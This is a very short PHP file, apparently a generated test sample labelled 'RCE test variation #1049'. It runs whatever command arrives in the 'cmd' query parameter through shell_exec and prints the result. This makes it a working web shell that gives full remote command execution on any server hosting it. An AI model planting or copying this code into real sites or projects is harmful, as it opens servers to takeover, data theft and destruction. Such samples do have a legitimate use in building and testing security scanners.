<?php
// RCE test variation #1049
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>